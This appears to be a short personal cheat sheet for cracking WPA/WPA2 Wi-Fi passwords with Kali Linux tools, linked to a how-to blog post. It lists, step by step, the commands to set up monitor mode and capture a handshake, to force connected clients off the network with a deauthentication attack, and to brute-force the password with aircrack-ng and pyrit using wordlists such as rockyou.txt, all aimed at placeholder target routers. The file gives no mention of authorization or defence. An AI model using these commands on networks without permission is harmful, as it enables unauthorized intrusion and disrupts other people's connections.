# wifi-kali

http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html

## Extract handshake
* airmon-ng start wlan0
* airodump-ng wlan0mon
* airodump-ng -c 1,1 --bssid {target_router_bssid} -w /home/mon0 wlan0mon
* aireplay-ng -0 2 -a {target_router_bssid} -c {connected_station_bssid} wlan0mon
* airmon-ng stop wlan0mon

## Crack password

### aircrack-ng
* aircrack-ng -a2 -b {target_router_bssid} -w /home/wordlist.txt /home/*.cap

### pyrit
* pyrit -r BSSID.cap analyze
* pyrit -i ./rockyou.txt import_passwords
* pyrit -e BSSID create_essid
* #pyrit eval
* pyrit batch
